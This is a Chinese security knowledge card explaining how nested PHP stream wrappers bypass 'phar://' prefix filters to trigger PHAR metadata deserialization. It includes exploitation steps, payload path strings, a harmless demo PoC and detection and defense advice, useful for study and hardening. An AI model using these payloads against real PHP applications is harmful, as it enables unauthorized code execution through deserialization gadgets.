---
id: web-php-deserialization-phar-prefix-wrapper-bypass
title: PHAR 前缀过滤绕过：compress.bzip2://、compress.zlib://、php://filter/resource= 去掉外层前缀后仍进入 phar
type: scenario
domain: web
path: web/php/deserialization
technique: phar-wrapper-prefix-strip-bypass
aliases:
- phar:// 前缀过滤绕过
- compress.bzip2 phar
- compress.zlib phar
- php://filter/resource=phar
- phar wrapper 嵌套
- phar 关键字绕过
tags:
- php
- phar
- deserialization
- wrapper
- waf-bypass
- compress
- php-filter
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T00:57:34+08:00'
  notes: '已对照原文与 img/12-15 核对：bz2.c strncasecmp("compress.bzip2://",path,17) path+=17、zlib.c compress.zlib:// path+=16 / zlib: path+=5、php_fopen_wrapper.c php:// path+=6 与 filter/resource p+10 均与截图一致；原文指出 zlib 需配 gzfile/gzopen/readgzfile，卡内已说明。三种外层 wrapper 为同一『前缀剥离后仍进入 phar』机制的不同变体，原子性可接受。未复跑；PHP<8.0 边界已注明。dedup 候选压缩 PHAR 本身/gif8 stub 是不同绕过机制，非同链。'
---

## 一句话结论

当防护只拒绝“以 `phar://` 开头”的路径时，可用 `compress.bzip2://phar://...`、`compress.zlib://phar://...`（或 `zlib:phar://...`）、`php://filter/resource=phar://...` 绕过：外层 wrapper 的 C 实现匹配并跳过自己的前缀后，把剩余字符串重新交给 `php_stream_open_wrapper`，最终仍按 `phar://` 打开并反序列化 metadata，外层字符串开头因此不是 `phar://`。

## 原理

- **bzip2 wrapper**：`ext/bz2/bz2.c` 的 `_php_stream_bz2open()` 中 `if (strncasecmp("compress.bzip2://", path, 17) == 0) { path += 17; }`；之后调用 `php_stream_open_wrapper(path, mode, ..., opened_path)` 打开剩余路径。因此 `compress.bzip2://phar:///tmp/x.phar` 被剥离 17 字节后变成 `phar:///tmp/x.phar`，仍进入 phar wrapper。
- **zlib wrapper**：`ext/zlib/zlib.c` 的 `php_stream_gzopen()` 中 `compress.zlib://` 匹配后 `path += 16`，`zlib:` 匹配后 `path += 5`，再 `php_stream_open_wrapper_ex(path, ...)`。注意原文指出 zlib 路径需要 `gzfile`/`gzopen`/`readgzfile` 这类内置函数来触发（直接 `file_get_contents('compress.zlib://...')` 的分支行为不同）。
- **php wrapper**：`main/streams/php_fopen_wrapper.c` 的 `php_stream_url_wrap_php()` 先剥离 `php://`（`strncasecmp(path, "php://", 6)` → `path += 6`）；对 `filter/resource=` 形式，后续把资源部分 `p + 10` 交给 `php_stream_open_wrapper`。因此 `php://filter/resource=phar:///tmp/x.phar` 外层不包含开头的 `phar://`，但 resource 仍按 phar 打开。
- **共同点**：过滤发生在“完整路径字符串”层，而 PHP stream wrapper 是分层解析的；外层 wrapper 只剥离自己的协议前缀，然后把剩余部分交给通用 `php_stream_open_wrapper`，所以任何“只检查字符串前缀/开头”的防护都可以被嵌套 wrapper 绕过。
- **版本边界**：PHAR metadata 自动反序列化主要适用于 PHP < 8.0；绕过 wrapper 前缀的机制本身与版本无关，但能否最终触发 metadata 反序列化仍取决于 PHP 版本/应用是否显式反序列化。

## 触发条件

- 应用对文件路径做了“不能以 phar:// 开头”“不含 phar://”等前缀/子串过滤，但未禁用 bz2/zlib/php filter wrapper，也未对解码/嵌套后的路径再做检查。
- 存在可控路径进入 `file_get_contents`、`include`、`gzfile`/`gzopen`/`readgzfile` 等会打开 wrapper 的函数。
- 目标 PHP 会在 `phar://` 打开时反序列化 metadata（PHP < 8.0），或应用显式反序列化 PHAR 内容。
- 攻击者可上传/放置 PHAR 文件，且目标 classpath 有 gadget。

## 利用步骤

1. 确认过滤规则：测试 `phar://...` 被拦截的位置与形式（前缀匹配、`strpos`、正则 `^phar://`、黑名单关键字）。
2. 选择外层 wrapper：
   - `compress.bzip2://phar:///path/exp.phar`：适用于 `file_get_contents`/`include` 等通用打开函数；
   - `compress.zlib://phar:///path/exp.phar` 或 `zlib:phar:///path/exp.phar`：配合 `gzfile`/`gzopen`/`readgzfile`；
   - `php://filter/resource=phar:///path/exp.phar`：适用于 `file_get_contents`/`include` 等。
3. 上传/放置 PHAR（stub `__HALT_COMPILER();` + metadata gadget），路径使用上述嵌套形式。
4. 触发目标函数，观察 metadata 反序列化与 gadget 执行；若过滤还检查 `phar` 子串，可再尝试大小写/URL 编码/多层 wrapper（视过滤实现）。
5. 若目标为 PHP 8+，改用应用显式反序列化 PHAR 内 manifest 的入口，或寻找仍会反序列化 metadata 的旧组件。

## PoC

```php
<?php
class Test {
    public function __destruct() { echo "phar triggered\n"; }
}
// 生成 phar：stub + metadata
$p = new Phar('/tmp/exp.phar');
$p->startBuffering();
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata(new Test());
$p->addFromString('x.txt', 'x');
$p->stopBuffering();
```

```php
<?php
// 1) bzip2 外层
file_get_contents('compress.bzip2://phar:///tmp/exp.phar');
// 2) zlib 外层（配合 gz 系列函数）
gzfile('compress.zlib://phar:///tmp/exp.phar');
// 3) php filter 外层
file_get_contents('php://filter/resource=phar:///tmp/exp.phar');
```

```text
源码偏移（PHP 7.x）：
bz2.c:    strncasecmp("compress.bzip2://", path, 17) == 0 -> path += 17
zlib.c:   strncasecmp("compress.zlib://", path, 16) == 0 -> path += 16
          strncasecmp("zlib:", path, 5) == 0             -> path += 5
php_fopen_wrapper.c:  strncasecmp(path, "php://", 6) == 0 -> path += 6
                      filter/resource 部分 p + 10 -> php_stream_open_wrapper
```

## 变体与关联

- 外层 wrapper 变体：`compress.bzip2://`、`compress.zlib://`、`zlib:`、`php://filter/resource=`；也可尝试多层嵌套（如 `php://filter/resource=compress.bzip2://phar://...`），是否能解析取决于各 wrapper 实现。
- 过滤绕过变体：大小写（`PhAr://`/`PHAR://`）、URL 编码、空白/控制字符、重复协议前缀；若过滤是 `strpos($path,'phar://') !== false`，嵌套 wrapper 仍包含该子串，需配合拼接/编码或选择不触发子串检查的入口。
- 关联卡片：[[web-php-deserialization-phar-sourcechain-zip-pgsql-sinks]]（PHAR 源码链与冷门 sink）、[[web-php-deserialization-compressed-phar-include-bypass]]（把 PHAR 文件本身 gzip/bzip2 压缩以隐藏关键字，与本卡“外层 wrapper 前缀”不同）、[[web-php-deserialization-phar-read-uploaded-image-pop-chain]]（上传触发链）。
- 边界：PHP 8.0+ 不自动反序列化 metadata；wrapper 被 `disable_functions`/`stream_wrapper_unregister` 禁用；过滤对完整路径做解码后再检查 `phar` 子串；目标函数不解析 wrapper。

## 检测与防御

- 检测：请求参数出现 `compress.bzip2://`、`compress.zlib://`、`zlib:`、`php://filter/resource=` 等嵌套/组合形式；路径中同时出现多个 scheme；上传文件/临时目录出现 `__HALT_COMPILER();`；反序列化异常与 gadget 类加载。
- 防御：不要只做 `phar://` 前缀/子串检查；先对路径做一次完整规范化与解码，再判断 scheme，拒绝任何嵌套的 `phar://`；禁用不需要的 wrapper（`stream_wrapper_unregister('phar')`、`compress.zlib`/`compress.bzip2`/`php` filter 按需限制）。
- 加固：升级 PHP 8+ 并避免显式反序列化 PHAR；使用 `allowed_classes` 白名单；上传目录与文件函数隔离；监控异常 wrapper 组合与反序列化行为。
